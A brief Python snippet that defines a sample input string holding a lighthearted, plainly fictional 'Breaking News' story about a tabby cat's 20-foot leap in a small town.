EXAMPLE_INPUT = "Breaking News: In an astonishing turn of events, the small \
town of Willow Creek has been taken by storm as local resident Jerry Thompson's cat, \
Whiskers, performed what witnesses are calling a 'miraculous and gravity-defying leap.' \
Eyewitnesses report that Whiskers, an otherwise unremarkable tabby cat, jumped \
a record-breaking 20 feet into the air to catch a fly. The event, which took \
place in Thompson's backyard, is now being investigated by scientists for potential \
breaches in the laws of physics. Local authorities are considering a town festival \
to celebrate what is being hailed as 'The Leap of the Century."
